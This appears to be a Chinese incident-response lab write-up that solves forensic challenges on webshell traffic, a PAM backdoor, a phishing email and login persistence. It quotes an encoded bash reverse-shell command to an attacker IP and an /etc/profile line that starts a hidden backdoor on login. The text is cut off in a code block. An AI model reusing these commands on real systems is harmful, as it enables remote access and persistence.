<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">哥斯拉webshell返回包流量解密为:<br><br>PRETTY_NAME=<span class="hljs-string">&quot;Debian GNU/Linux 10 (buster)&quot;</span><br>NAME=<span class="hljs-string">&quot;Debian GNU/Linux&quot;</span><br>VERSION_ID=<span class="hljs-string">&quot;10&quot;</span><br>VERSION=<span class="hljs-string">&quot;10 (buster)&quot;</span><br>VERSION_CODENAME=buster<br>ID=debian<br>HOME_URL=<span class="hljs-string">&quot;https://www.debian.org/&quot;</span><br>SUPPORT_URL=<span class="hljs-string">&quot;https://www.debian.org/support&quot;</span><br>BUG_REPORT_URL=<span class="hljs-string">&quot;https://bugs.debian.org/&quot;</span><br><br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;Debian GNU/Linux <span class="hljs-number">10</span> (buster)&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q9"><a class="markdownIt-Anchor" href="#q9"></a> Q9</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">9、黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令）<br></code></pre></td></tr></table></figure>
<p>下面一条流量回显是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">哥斯拉webshell返回包流量解密为:<br><br>2&gt;&amp;1: 1: 2&gt;&amp;1: rmp: not found<br></code></pre></td></tr></table></figure>
<p>继续找后面的流量</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dpkg</span> -l libpam-modules:amd64<br></code></pre></td></tr></table></figure>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">哥斯拉webshell返回包流量解密为:<br><br>Desired=Unknown/Install/Remove/Purge/Hold<br>| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend<br>|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)<br><span class="hljs-section">||/ Name                 Version      Architecture Description</span><br><span class="hljs-section">+++-====================-============-============-========================================</span><br>ii  libpam-modules:amd64 1.3.1-5      amd64        Pluggable Authentication Modules for PAM<br><br></code></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">flag&#123;dpkg -l libpam-modules:amd64&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q10"><a class="markdownIt-Anchor" href="#q10"></a> Q10</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">10、黑客留下后门的反连的IP和PORT是什么？（IP:PORT)<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09181845.png" srcset="/img/loading.gif" lazyload alt="2025-03-09181845"></p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==<br><span class="hljs-number">192.168.31.143</span>/<span class="hljs-number">1313</span><br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.31.143:1313</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q11"><a class="markdownIt-Anchor" href="#q11"></a> Q11</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">11、黑客通过什么文件留下了后门？<br></code></pre></td></tr></table></figure>
<p>eq56里</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">哥斯拉webshell请求流量解密为:<br>fileName  /tmp/pam_unix.sofileValue  NELF<br></code></pre></td></tr></table></figure>
<h2 id="q12"><a class="markdownIt-Anchor" href="#q12"></a> Q12</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">12、黑客设置的后门密码是什么？<br></code></pre></td></tr></table></figure>
<p>进入服务器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-3:~# find / -name <span class="hljs-string">&quot;pam_unix.so&quot;</span> 2&gt;/dev/null<br>/usr/lib/x86_64-linux-gnu/security/pam_unix.so<br>root@ip-10-0-10-3:~# <span class="hljs-built_in">cd</span> /usr/lib/x86_64-linux-gnu/security/<br>root@ip-10-0-10-3:/usr/lib/x86_64-linux-gnu/security# <span class="hljs-built_in">ls</span> -al<br>total 1328<br>drwxr-xr-x  2 root root   4096 Dec 25  2023 .<br>drwxr-xr-x 26 root root  36864 Sep 19 07:35 ..<br>-rw-r--r--  1 root root  18632 Feb 14  2019 pam_access.so<br>-rw-r--r--  1 root root  14400 Feb 14  2019 pam_debug.so<br>-rw-r--r--  1 root root  13968 Feb 14  2019 pam_deny.so<br>-rw-r--r--  1 root root  14368 Feb 14  2019 pam_echo.so<br>-rw-r--r--  1 root root  18560 Feb 14  2019 pam_env.so<br>-rw-r--r--  1 root root  18752 Feb 14  2019 pam_exec.so<br>-rw-r--r--  1 root root  14408 Feb 14  2019 pam_faildelay.so<br>-rw-r--r--  1 root root  18608 Feb 14  2019 pam_filter.so<br>-rw-r--r--  1 root root  14344 Feb 14  2019 pam_ftp.so<br>-rw-r--r--  1 root root  18640 Feb 14  2019 pam_group.so<br>-rw-r--r--  1 root root  14480 Feb 14  2019 pam_issue.so<br>-rw-r--r--  1 root root  14376 Feb 14  2019 pam_keyinit.so<br>-rw-r--r--  1 root root  18592 Feb 14  2019 pam_lastlog.so<br>-rw-r--r--  1 root root  26976 Feb 14  2019 pam_limits.so<br>-rw-r--r--  1 root root  14408 Feb 14  2019 pam_listfile.so<br>-rw-r--r--  1 root root  14344 Feb 14  2019 pam_localuser.so<br>-rw-r--r--  1 root root  14432 Feb 14  2019 pam_loginuid.so<br>-rw-r--r--  1 root root  14408 Feb 14  2019 pam_mail.so<br>-rw-r--r--  1 root root  14384 Feb 14  2019 pam_mkhomedir.so<br>-rw-r--r--  1 root root  14440 Feb 14  2019 pam_motd.so<br>-rw-r--r--  1 root root  43744 Feb 14  2019 pam_namespace.so<br>-rw-r--r--  1 root root  14360 Feb 14  2019 pam_nologin.so<br>-rw-r--r--  1 root root  14296 Feb 14  2019 pam_permit.so<br>-rw-r--r--  1 root root  18696 Feb 14  2019 pam_pwhistory.so<br>-rw-r--r--  1 root root  14328 Feb 14  2019 pam_rhosts.so<br>-rw-r--r--  1 root root  14400 Feb 14  2019 pam_rootok.so<br>-rw-r--r--  1 root root  14400 Feb 14  2019 pam_securetty.so<br>-rw-r--r--  1 root root  22840 Feb 14  2019 pam_selinux.so<br>-rw-r--r--  1 root root  18664 Feb 14  2019 pam_sepermit.so<br>-rw-r--r--  1 root root  14344 Feb 14  2019 pam_shells.so<br>-rw-r--r--  1 root root  18480 Feb 14  2019 pam_stress.so<br>-rw-r--r--  1 root root  18536 Feb 14  2019 pam_succeed_if.so<br>-rw-r--r--  1 root root 286840 Jun 29  2023 pam_systemd.so<br>-rw-r--r--  1 root root  18608 Feb 14  2019 pam_tally2.so<br>-rw-r--r--  1 root root  18568 Feb 14  2019 pam_tally.so<br>-rw-r--r--  1 root root  18608 Feb 14  2019 pam_time.so<br>-rw-r--r--  1 root root  22880 Feb 14  2019 pam_timestamp.so<br>-rw-r--r--  1 root root  14424 Feb 14  2019 pam_tty_audit.so<br>-rw-r--r--  1 root root  14472 Feb 14  2019 pam_umask.so<br>-rw-r--r--  1 root root 216744 Sep 19 09:04 pam_unix.so<br>-rw-r--r--  1 root root  14456 Feb 14  2019 pam_userdb.so<br>-rw-r--r--  1 root root  14296 Feb 14  2019 pam_warn.so<br>-rw-r--r--  1 root root  14352 Feb 14  2019 pam_wheel.so<br>-rw-r--r--  1 root root  22944 Feb 14  2019 pam_xauth.so<br>root@ip-10-0-10-3:/usr/lib/x86_64-linux-gnu/security# file pam_unix.so<br>pam_unix.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=b823fd038f580c704c3c8e26f383e82b7cdb5f59, with debug_info, not stripped<br></code></pre></td></tr></table></figure>
<p>把文件下载到本地</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">flag&#123;<span class="hljs-symbol">XJ@</span><span class="hljs-number">123</span>&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09183755.png" srcset="/img/loading.gif" lazyload alt="2025-03-09183755"></p>
<h2 id="q13"><a class="markdownIt-Anchor" href="#q13"></a> Q13</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">13、黑客的恶意dnslog服务器地址是什么？<br></code></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">flag&#123;c0ee2ad2d8<span class="hljs-selector-class">.ipv6</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.eu</span><span class="hljs-selector-class">.org</span>.&#125;<br></code></pre></td></tr></table></figure>
<p>同上，但论做题的话很多流程都是一样的知识点我没细入。</p>
<h1 id="第七章-常见攻击事件分析钓鱼邮件"><a class="markdownIt-Anchor" href="#第七章-常见攻击事件分析钓鱼邮件"></a> 第七章 常见攻击事件分析–钓鱼邮件</h1>
<h2 id="q1-19"><a class="markdownIt-Anchor" href="#q1-19"></a> Q1</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">请分析获取黑客发送钓鱼邮件时使用的IP，flag格式： flag&#123;11.22.33.44&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09215030.png" srcset="/img/loading.gif" lazyload alt="2025-03-09215030"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">121.204.224.15</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q2-19"><a class="markdownIt-Anchor" href="#q2-19"></a> Q2</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">请分析获取黑客钓鱼邮件中使用的木马程序的控制端IP，flag格式：flag&#123;11.22.33.44&#125;<br></code></pre></td></tr></table></figure>
<p>把eml放在安恒云沙盒里跑一下</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09220123.png" srcset="/img/loading.gif" lazyload alt="2025-03-09220123"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">107.16.111.57</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q3-19"><a class="markdownIt-Anchor" href="#q3-19"></a> Q3</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">黑客在被控服务器上创建了webshell，请分析获取webshell的文件名，请使用完整文件格式，flag格式：flag&#123;/var/www/html/shell.php&#125;<br></code></pre></td></tr></table></figure>
<p>用d盾扫一下</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">flag&#123;<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>admin<span class="hljs-regexp">/ebak/</span>ReData.php&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q4-16"><a class="markdownIt-Anchor" href="#q4-16"></a> Q4</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">flag4: 黑客在被控服务器上创建了内网代理隐蔽通信隧道，请分析获取该隧道程序的文件名，请使用完整文件路径，flag格式：flag&#123;/opt/apache2/shell&#125;<br></code></pre></td></tr></table></figure>
<p>攻击者修改my.conf文件 进行了socks5代理</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>tmp<span class="hljs-regexp">/proc/my</span>sql<br></code></pre></td></tr></table></figure>
<h1 id="第九章-blueteam-的小心思"><a class="markdownIt-Anchor" href="#第九章-blueteam-的小心思"></a> 第九章-blueteam 的小心思</h1>
<h2 id="q1-20"><a class="markdownIt-Anchor" href="#q1-20"></a> Q1</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag&#123;md5&#125;。<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu18:~# <span class="hljs-built_in">ls</span> /<br>bin    etc             lib         mnt   run   swap.img  var<br>boot   home            lib64       opt   sbin  sys       vmlinuz<br>cdrom  initrd.img      lost+found  proc  snap  tmp       vmlinuz.old<br>dev    initrd.img.old  media       root  srv   usr       wireshark.pcap<br></code></pre></td></tr></table></figure>
<p>下载分析一下流量包</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-06193354.png" srcset="/img/loading.gif" lazyload alt="2025-03-06193354"></p>
<p>主要分析login.php那里有几个密码，挨个试一下得到</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">Form</span> item: <span class="hljs-string">&quot;password&quot;</span> = <span class="hljs-string">&quot;Aa12345^&quot;</span><br>flag&#123;D63EDB0E9DF4CF411398E3658C0237E0&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q2-20"><a class="markdownIt-Anchor" href="#q2-20"></a> Q2</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串&quot;upload.php&quot;的小写md5值，格式flag&#123;md5&#125;。<br></code></pre></td></tr></table></figure>
<p>先看流量包最后几条都是进行的命令执行，往前翻</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-06193736.png" srcset="/img/loading.gif" lazyload alt="2025-03-06193736"></p>
<p>有一处upload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">897</span>	<span class="hljs-number">98</span>.<span class="hljs-number">458872</span>	<span class="hljs-number">192.168.16.43</span>	<span class="hljs-number">192.168.18.24</span>	HTTP	<span class="hljs-number">682</span>	POST /pluginmgr.php?op=upload HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>  (application/zip)<br></code></pre></td></tr></table></figure>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;B05C0BE368FFA72E6CB2DF7E1E1B27BE&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q3-20"><a class="markdownIt-Anchor" href="#q3-20"></a> Q3</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag&#123;md5&#125;。<br></code></pre></td></tr></table></figure>
<p>在这条流量包往后翻就能看到了是<code>cpg.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu18:~# find / -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;cpg.php&quot;</span><br>/var/www/html/plugins/cpg.php<br>root@ubuntu18:~# <span class="hljs-built_in">md5sum</span> /var/www/html/plugins/cpg.php<br>a097b773ced57bb7d51c6719fe8fe5f5  /var/www/html/plugins/cpg.php<br></code></pre></td></tr></table></figure>
<h2 id="q4-17"><a class="markdownIt-Anchor" href="#q4-17"></a> Q4</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag&#123;md5&#125;。<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-06194335.png" srcset="/img/loading.gif" lazyload alt="2025-03-06194335"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu18:~# find / -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;is.world&quot;</span><br>/var/www/html/plugins/.       /is.world<br>root@ubuntu18:~# <span class="hljs-built_in">md5sum</span> <span class="hljs-string">&quot;/var/www/html/plugins/.       /is.world&quot;</span><br>ee279c39bf3dcb225093bdbafeb9a439  /var/www/html/plugins/.       /is.world<br></code></pre></td></tr></table></figure>
<h2 id="q5-13"><a class="markdownIt-Anchor" href="#q5-13"></a> Q5</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串&quot;attack&quot;的小写md5值，格式flag&#123;md5&#125;。<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu18:~# <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin<br>syslog:x:102:106::/home/syslog:/usr/sbin/nologin<br>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin<br>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin<br>lxd:x:105:65534::/var/lib/lxd/:/bin/false<br>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin<br>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<br>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:109:1::/var/cache/pollinate:/bin/false<br>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin<br>mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false<br>knowledgegraphd:x:0:0::/home/knowledgegraphd:/bin/bash<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">knowledgegraphd<br>flag&#123;4CDA3461543C9A770A3349760594FACD&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q6-6"><a class="markdownIt-Anchor" href="#q6-6"></a> Q6</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag&#123;md5&#125;。<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu18:~# <span class="hljs-built_in">cat</span> /etc/profile<br><span class="hljs-comment"># /etc/profile: system-wide .profile file for the Bourne shell (sh(1))</span><br><span class="hljs-comment"># and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;PS1-&#125;</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>  <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;BASH-&#125;</span>&quot;</span> ] &amp;&amp; [ <span class="hljs-string">&quot;<span class="hljs-variable">$BASH</span>&quot;</span> != <span class="hljs-string">&quot;/bin/sh&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-comment"># The file bash.bashrc already sets the default PS1.</span><br>    <span class="hljs-comment"># PS1=&#x27;\h:\w\$ &#x27;</span><br>    <span class="hljs-keyword">if</span> [ -f /etc/bash.bashrc ]; <span class="hljs-keyword">then</span><br>      . /etc/bash.bashrc<br>    <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;`id -u`&quot;</span> -eq 0 ]; <span class="hljs-keyword">then</span><br>      PS1=<span class="hljs-string">&#x27;# &#x27;</span><br>    <span class="hljs-keyword">else</span><br>      PS1=<span class="hljs-string">&#x27;$ &#x27;</span><br>    <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br>/var/www/html/plugins/<span class="hljs-string">&quot;.       &quot;</span>/is.world &amp;<br><span class="hljs-keyword">if</span> [ -d /etc/profile.d ]; <span class="hljs-keyword">then</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> /etc/profile.d/*.sh; <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> [ -r <span class="hljs-variable">$i</span> ]; <span class="hljs-keyword">then</span><br>      . <span class="hljs-variable">$i</span><br>    <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">done</span><br>  <span class="hljs-built_in">unset</span> i<br><span class="hljs-keyword">fi</span><br>root@ubuntu18:~# <span class="hljs-built_in">md5sum</span> /etc/profile<br>65bf3e4a9ac90d75ec28be0317775618  /etc/profile<br></code></pre></td></tr></table></figure>
<h2 id="q7-5"><a class="markdownIt-Anchor" href="#q7-5"></a> Q7</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag&#123;md5&#125;。<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 